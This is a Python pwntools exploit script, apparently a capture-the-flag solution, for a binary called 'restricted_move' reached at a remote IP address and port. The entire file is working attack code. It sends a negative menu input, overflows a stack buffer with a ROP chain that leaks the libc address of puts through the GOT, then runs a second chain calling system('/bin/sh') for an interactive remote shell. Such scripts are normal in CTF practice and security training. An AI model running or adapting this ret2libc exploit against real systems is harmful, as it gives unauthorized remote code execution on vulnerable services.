from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./restricted_move')
# p = elf.process()
p = remote('34.81.158.137', 7364)

pop_rdi = 0x401883

p.recv()
p.sendline(b'2')
p.recv()
p.sendline(b'-40')

p.recv()
p.sendline(b'4')
p.recv()

payload = b'a'*136
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.sym['puts'])
payload += p64(elf.sym['change_info'])

p.sendline(payload)
p.recvline()

libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.sym['puts']
print(hex(libc.address))

system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'a'*136
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rdi + 1)
payload += p64(system)

p.sendline(payload)

p.interactive()